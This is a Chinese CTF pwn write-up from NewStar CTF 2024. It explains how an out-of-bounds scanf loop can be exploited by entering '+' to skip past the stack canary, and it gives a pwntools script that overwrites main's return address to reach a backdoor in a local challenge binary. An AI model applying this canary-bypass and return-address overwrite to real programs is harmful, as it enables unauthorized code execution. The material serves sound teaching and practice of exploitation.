# 不思議なscanf

> 分类：Pwn

## 题目描述
程序定义了一个 int 类型的数组，并利用 for 循环用 scanf 向数组读入内容，但 for 循环的次数是 16 次，超出了数组定义的范围，造成数组越界。

```c
int __fastcall main(int argc, const char **argv, const char**envp)
{
  int v3; // eax
  int i; // [rsp+Ch] [rbp-24h]
  _DWORD v6[6]; // [rsp+10h] [rbp-20h] BYREF
  unsigned__int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  initial(argc, argv, envp);
  puts(aGgggggggggeeee);
  for ( i = 0; i <= 15; ++i )
  {
    printf(format);
    v3 = i;
    __isoc99_scanf(&unk_4047FA, &v6[v3]);
  }
  puts("銉愩偆銉愩偆");
  return 0;
}
```

## 考察知识点
- 数组越界
- 覆盖返回地址
- scanf 的多次输入特性（跳过 Canary）

## 解法
最终目的是利用数组越界修改 `main` 函数的返回地址。

`scanf` 使用 `%d` 时的输入特性：
- 若输入为非数字且仅有一个，该输入无效，该值不变；
- 若输入有数字前缀（如 `12345abcd`），只读取前面的数字；
- 若在循环中（一个 scanf 仅有一个输入）输入非数字时，若输入的不是 `+` 或 `-`，则后面紧跟的所有 scanf 均自动跳过变为无效；若输入的是 `+` 或 `-`，则会跳过当前输入，后面仍然可以继续输入。

利用这一特性，通过输入字符 `+` 跳过对 Canary 的修改，进而直接修改返回地址为后门地址。

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

p = process('./pwn')
elf = ELF('./pwn')

for _ in range(10):
    ru('わたし、気になります！')
    sl(b'+')

ru('わたし、気になります！')
sl(str(0x401240))
ru('わたし、気になります！')
sl(str(0))

for _ in range(4):
    ru('わたし、気になります！')
    sl(b'+')

p.interactive()
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week3/pwn/scanf.html
